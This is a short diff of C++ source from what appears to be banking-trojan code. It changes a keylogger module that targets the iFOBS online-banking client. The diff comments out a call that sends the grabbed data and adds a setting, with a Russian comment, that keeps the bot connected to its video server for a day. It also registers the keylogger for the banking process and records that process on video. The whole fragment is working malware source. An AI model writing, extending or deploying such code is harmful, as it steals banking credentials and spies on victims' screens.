@@ -546,8 +546,9 @@ void Activeted1(LPVOID Sender)
 	DBG( "IFobs", "Activated1" );
 	PKeyLogSystem System = (PKeyLogSystem)Sender;
 //	if( !Bot->FileExists( 0, GetStr(IFobsFlagCopy).t_str() ) )
-		MegaJump(SendIFobs);
+//		MegaJump(SendIFobs);
 	VideoProcess::RecordPID( 0, "IFobs" );
+	VideoProcess::UpdateSettings( 0, 0, 0, 24 * 60 * 60 ); //бот не должен отключаться от видео сервера
 	typeActive = 1;
 }
 //активация при подписывании
@@ -560,11 +561,11 @@ void Activeted2(LPVOID Sender)
 
 bool Init( const char* appName )
 {
-	DBG( "IFobs", "Регистрация системы" );
 	resultGrab[0] = 0;
 	PKeyLogSystem S = KeyLogger::AddSystem( "ifobs", PROCESS_HASH );
 	if( S != NULL )
 	{
+		DBG( "IFobs", "Регистрация системы" );
 		//фильтр на форму регистрации
 //		char* caption11 = "*iFOBS*ст*ац*я*";
 //		char* caption12 = "*iFOBS*Regis*";
